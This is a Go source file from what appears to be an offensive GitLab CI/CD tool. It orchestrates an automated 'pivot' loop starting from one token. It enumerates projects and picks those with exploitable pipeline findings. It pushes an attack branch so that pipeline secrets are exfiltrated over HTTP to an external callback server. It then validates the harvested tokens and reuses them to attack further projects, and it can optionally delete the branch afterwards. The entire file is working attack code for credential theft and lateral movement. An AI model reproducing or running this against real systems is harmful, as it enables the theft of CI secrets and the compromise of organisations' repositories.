package pivot

import (
	"context"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	gitlab "gitlab.com/gitlab-org/api/client-go"

	"github.com/mr-pmillz/gogatoz/pkg/attack"
	"github.com/mr-pmillz/gogatoz/pkg/enumerate"
	"github.com/mr-pmillz/gogatoz/pkg/enumerate/report"
	"github.com/mr-pmillz/gogatoz/pkg/gitlabx"
)

// PivotStats summarizes a pivot session.
type PivotStats struct {
	ProjectsEnumerated int           `json:"projects_enumerated"`
	ProjectsAttacked   int           `json:"projects_attacked"`
	CredentialsFound   int           `json:"credentials_found"`
	CredentialsValid   int           `json:"credentials_valid"`
	MaxDepthReached    int           `json:"max_depth_reached"`
	Duration           time.Duration `json:"duration_ms"`
	ExploitableTargets int           `json:"exploitable_targets"`
}

// ExfilEntry represents a single exfiltrated key/value pair with source context.
type ExfilEntry struct {
	ProjectID   int64  `json:"project_id"`
	ProjectPath string `json:"project_path"`
	Depth       int    `json:"depth"`
	Key         string `json:"key"`
	Value       string `json:"value"`
}

// ExploitableTarget represents a project with an exploitable finding.
type ExploitableTarget struct {
	ProjectID int64
	Path      string
	FindingID string
	Tags      string
}

// Orchestrator manages the pivot loop lifecycle.
type Orchestrator struct {
	initialClient *gitlabx.Client
	gitlabURL     string
	opts          Options
	creds         *CredentialStore
	callback      *CallbackServer
	clients       map[string]*gitlabx.Client // tokenHash → client
	clientsMu     sync.Mutex
	stats         PivotStats
	exfilData     []ExfilEntry
	exfilMu       sync.Mutex
}

// NewOrchestrator creates a pivot orchestrator with the initial token.
func NewOrchestrator(gitlabURL, token string, opts Options) (*Orchestrator, error) {
	opts.defaults()

	cl, err := gitlabx.New(gitlabURL, token, opts.ClientOptions...)
	if err != nil {
		return nil, fmt.Errorf("create initial client: %w", err)
	}

	return &Orchestrator{
		initialClient: cl,
		gitlabURL:     gitlabURL,
		opts:          opts,
		creds:         NewCredentialStore(),
		clients:       make(map[string]*gitlabx.Client),
	}, nil
}

// Run executes the pivot loop: enumerate → filter → attack → harvest → repeat.
func (o *Orchestrator) Run(ctx context.Context) (*PivotStats, error) {
	start := time.Now()
	ctx, cancel := context.WithTimeout(ctx, o.opts.Timeout)
	defer cancel()

	privKey, pubPEM, err := o.setupRSAKey()
	if err != nil {
		return nil, fmt.Errorf("rsa setup: %w", err)
	}

	if !o.opts.DryRun {
		o.callback = NewCallbackServer(privKey, 100)
		go func() {
			if err := o.callback.Start(ctx, o.opts.ListenAddr); err != nil {
				o.emit(PivotEvent{Type: "error", Message: "callback server: " + err.Error()})
			}
		}()
		defer func() {
			shutCtx, shutCancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer shutCancel()
			_ = o.callback.Stop(shutCtx)
		}()
	}

	initialHash := hashToken(o.initialClient.Token())
	initialCred := &Credential{
		Token: o.initialClient.Token(), TokenHash: initialHash,
		TokenType: classifyTokenType(o.initialClient.Token()),
		IsValid:   true, GitLabURL: o.gitlabURL,
	}
	o.creds.Add(initialCred)
	o.clients[initialHash] = o.initialClient

	credQueue := []*Credential{initialCred}
	var totalAttacked int32

	for depth := 0; depth < o.opts.MaxDepth && len(credQueue) > 0; depth++ {
		o.emit(PivotEvent{Type: "depth_start", Depth: depth, Message: fmt.Sprintf("starting depth %d with %d credential(s)", depth, len(credQueue))})
		nextQueue := o.processDepth(ctx, credQueue, pubPEM, depth, &totalAttacked)
		o.stats.MaxDepthReached = depth + 1
		o.emit(PivotEvent{Type: "depth_end", Depth: depth, Message: fmt.Sprintf("completed depth %d", depth)})
		credQueue = nextQueue
	}

	o.stats.ProjectsAttacked = int(atomic.LoadInt32(&totalAttacked))
	o.stats.CredentialsFound = o.creds.Len() - 1
	validCount := 0
	for _, c := range o.creds.All() {
		if c.IsValid && c.TokenHash != initialHash {
			validCount++
		}
	}
	o.stats.CredentialsValid = validCount
	o.stats.Duration = time.Since(start)
	return &o.stats, nil
}

func (o *Orchestrator) processDepth(ctx context.Context, credQueue []*Credential, pubPEM string, depth int, totalAttacked *int32) []*Credential {
	var nextQueue []*Credential
	for _, cred := range credQueue {
		if ctx.Err() != nil {
			break
		}
		cl := o.getClient(cred)
		if cl == nil {
			continue
		}
		results, err := o.enumerateWithToken(ctx, cl, depth)
		if err != nil {
			o.emit(PivotEvent{Type: "error", Depth: depth, Message: fmt.Sprintf("enumerate: %v", err)})
			continue
		}
		targets := filterExploitable(results)
		o.emit(PivotEvent{Type: "enumerate", Depth: depth, Message: fmt.Sprintf("found %d exploitable targets from %d projects", len(targets), len(results))})
		o.stats.ExploitableTargets += len(targets)
		if o.opts.DryRun {
			continue
		}
		harvested := o.attackAndHarvest(ctx, cl, cred, targets, pubPEM, depth, totalAttacked)
		nextQueue = append(nextQueue, harvested...)
	}
	return nextQueue
}

func (o *Orchestrator) attackAndHarvest(ctx context.Context, cl *gitlabx.Client, cred *Credential, targets []ExploitableTarget, pubPEM string, depth int, totalAttacked *int32) []*Credential {
	var harvested []*Credential
	for _, target := range targets {
		if ctx.Err() != nil || int(atomic.LoadInt32(totalAttacked)) >= o.opts.MaxTargets {
			break
		}
		if o.creds.IsVisited(cred.TokenHash, target.ProjectID) {
			continue
		}
		o.creds.MarkVisited(cred.TokenHash, target.ProjectID)

		pipelineURL, err := o.attackTarget(ctx, cl, target, pubPEM)
		if err != nil {
			o.emit(PivotEvent{Type: "error", Depth: depth, Message: fmt.Sprintf("attack %s: %v", target.Path, err)})
			continue
		}
		atomic.AddInt32(totalAttacked, 1)
		o.emit(PivotEvent{Type: "attack", Depth: depth, Message: fmt.Sprintf("attacked %s -> %s", target.Path, pipelineURL)})

		payload, err := o.callback.Receive(ctx, 5*time.Minute)
		if err != nil {
			o.emit(PivotEvent{Type: "error", Depth: depth, Message: fmt.Sprintf("receive from %s: %v", target.Path, err)})
			continue
		}

		// Store all exfiltrated env vars
		o.storeExfilData(payload.Secrets, target, depth)

		harvested = append(harvested, o.harvestTokens(ctx, payload, target, depth)...)

		if o.opts.Cleanup {
			att := attack.NewAttacker(cl, o.gitlabURL, "", "", 30*time.Second)
			_ = att.DeleteBranch(ctx, target.ProjectID, o.opts.AttackBranch)
		}
	}
	return harvested
}

func (o *Orchestrator) harvestTokens(ctx context.Context, payload *ExfilPayload, target ExploitableTarget, depth int) []*Credential {
	var harvested []*Credential
	newTokens := ExtractTokens(payload.Secrets)
	for i := range newTokens {
		tok := &newTokens[i]
		if o.creds.Has(tok.TokenHash) || o.creds.Len() >= o.opts.MaxCredentials {
			continue
		}
		tok.SourceProjectID = target.ProjectID
		tok.Depth = depth + 1

		validated, err := ValidateToken(ctx, o.gitlabURL, tok.Token, o.opts.ClientOptions...)
		if err != nil {
			continue
		}
		validated.SourceKey = tok.SourceKey
		validated.SourceProjectID = tok.SourceProjectID
		validated.Depth = tok.Depth

		o.creds.Add(validated)
		o.emit(PivotEvent{Type: "credential", Depth: depth, Message: fmt.Sprintf("harvested %s token from %s (%s)", validated.TokenType, tok.SourceKey, target.Path)})

		if validated.IsValid {
			harvested = append(harvested, validated)
		}
	}
	return harvested
}

func (o *Orchestrator) setupRSAKey() (*rsa.PrivateKey, string, error) {
	if o.opts.RSAKeyPath != "" {
		keyData, err := os.ReadFile(o.opts.RSAKeyPath)
		if err != nil {
			return nil, "", fmt.Errorf("read rsa key: %w", err)
		}
		block, _ := pem.Decode(keyData)
		if block == nil {
			return nil, "", fmt.Errorf("invalid PEM in %s", o.opts.RSAKeyPath)
		}
		privKey, err := x509.ParsePKCS1PrivateKey(block.Bytes)
		if err != nil {
			// Try PKCS8
			key, err2 := x509.ParsePKCS8PrivateKey(block.Bytes)
			if err2 != nil {
				return nil, "", fmt.Errorf("parse rsa key (pkcs1: %w, pkcs8: %w)", err, err2)
			}
			var ok bool
			privKey, ok = key.(*rsa.PrivateKey)
			if !ok {
				return nil, "", fmt.Errorf("key is not RSA")
			}
		}
		pubDER, err := x509.MarshalPKIXPublicKey(&privKey.PublicKey)
		if err != nil {
			return nil, "", err
		}
		pubPEM := pem.EncodeToMemory(&pem.Block{Type: "PUBLIC KEY", Bytes: pubDER})
		return privKey, string(pubPEM), nil
	}
	return GenerateKeyPair(o.opts.RSAKeyBits)
}

func (o *Orchestrator) enumerateWithToken(ctx context.Context, cl *gitlabx.Client, depth int) ([]enumerate.Result, error) {
	idents := o.opts.InitialTargets
	if depth > 0 {
		// Discover projects accessible to the harvested token via membership.
		discovered, err := o.discoverMemberProjects(ctx, cl)
		if err == nil && len(discovered) > 0 {
			idents = discovered
		}
	}

	results, err := enumerate.EnumerateProjects(ctx, cl, idents, enumerate.Options{
		Concurrency:    o.opts.EnumConcurrency,
		Timeout:        30 * time.Second,
		FollowIncludes: o.opts.FollowIncludes,
		IncludeDepth:   o.opts.IncludeDepth,
		FetchRunners:   o.opts.FetchRunners,
		RunnerScope:    o.opts.RunnerScope,
	})
	o.stats.ProjectsEnumerated += len(results)
	return results, err
}

// discoverMemberProjects lists projects the token has membership on.
func (o *Orchestrator) discoverMemberProjects(ctx context.Context, cl *gitlabx.Client) ([]string, error) {
	var idents []string
	var page int64 = 1
	for page > 0 {
		projects, resp, err := cl.GL.Projects.ListProjects(
			&gitlab.ListProjectsOptions{
				Membership: new(true),
				ListOptions: gitlab.ListOptions{
					Page:    page,
					PerPage: 100,
				},
			}, gitlab.WithContext(ctx))
		if err != nil {
			return idents, err
		}
		for _, p := range projects {
			idents = append(idents, p.PathWithNamespace)
		}
		if resp != nil && resp.NextPage > 0 {
			page = resp.NextPage
		} else {
			page = 0
		}
	}
	return idents, nil
}

// filterExploitable extracts projects with exploitable findings from enumerate results.
func filterExploitable(results []enumerate.Result) []ExploitableTarget {
	var targets []ExploitableTarget
	seen := make(map[int64]bool)

	for _, r := range results {
		if seen[r.ProjectID] {
			continue
		}
		for _, f := range r.Findings {
			if !report.IsExploitable(f.ID) {
				continue
			}
			tags := report.ResolveTags(r.RunnerTagHits, f.Evidence)
			targets = append(targets, ExploitableTarget{
				ProjectID: r.ProjectID,
				Path:      r.ProjectPathWithNS,
				FindingID: f.ID,
				Tags:      tags,
			})
			seen[r.ProjectID] = true
			break // one target per project
		}
	}
	return targets
}

func (o *Orchestrator) attackTarget(ctx context.Context, cl *gitlabx.Client, target ExploitableTarget, pubPEM string) (string, error) {
	att := attack.NewAttacker(cl, o.gitlabURL, "", "", 30*time.Second)
	sec := attack.NewSecretsAttack(att)

	var tags []string
	if target.Tags != "" {
		tags = splitTags(target.Tags)
	}

	exfil := attack.ExfilOptions{
		Method: "http",
		Target: o.opts.ExternalURL,
	}

	pipelineURL, _, err := sec.RunExfil(ctx, target.ProjectID, o.opts.AttackBranch, pubPEM, tags, exfil)
	if err != nil {
		return "", err
	}
	return pipelineURL, nil
}

func (o *Orchestrator) getClient(cred *Credential) *gitlabx.Client {
	o.clientsMu.Lock()
	defer o.clientsMu.Unlock()

	if cl, ok := o.clients[cred.TokenHash]; ok {
		return cl
	}
	cl, err := gitlabx.New(o.gitlabURL, cred.Token, o.opts.ClientOptions...)
	if err != nil {
		return nil
	}
	o.clients[cred.TokenHash] = cl
	return cl
}

func (o *Orchestrator) storeExfilData(secrets map[string]string, target ExploitableTarget, depth int) {
	if len(secrets) == 0 {
		return
	}
	o.exfilMu.Lock()
	defer o.exfilMu.Unlock()
	for k, v := range secrets {
		o.exfilData = append(o.exfilData, ExfilEntry{
			ProjectID:   target.ProjectID,
			ProjectPath: target.Path,
			Depth:       depth,
			Key:         k,
			Value:       v,
		})
	}
}

func (o *Orchestrator) emit(event PivotEvent) {
	if o.opts.Progress != nil {
		o.opts.Progress(event)
	}
}

func splitTags(tags string) []string {
	var out []string
	for _, t := range strings.Split(tags, ",") {
		t = strings.TrimSpace(t)
		if t != "" {
			out = append(out, t)
		}
	}
	return out
}

// Credentials returns the credential store for external access (e.g., store integration).
func (o *Orchestrator) Credentials() *CredentialStore {
	return o.creds
}

// ExfilData returns all exfiltrated key/value pairs across all depths.
func (o *Orchestrator) ExfilData() []ExfilEntry {
	o.exfilMu.Lock()
	defer o.exfilMu.Unlock()
	out := make([]ExfilEntry, len(o.exfilData))
	copy(out, o.exfilData)
	return out
}

// Stats returns a copy of the current stats.
func (o *Orchestrator) Stats() PivotStats {
	return o.stats
}
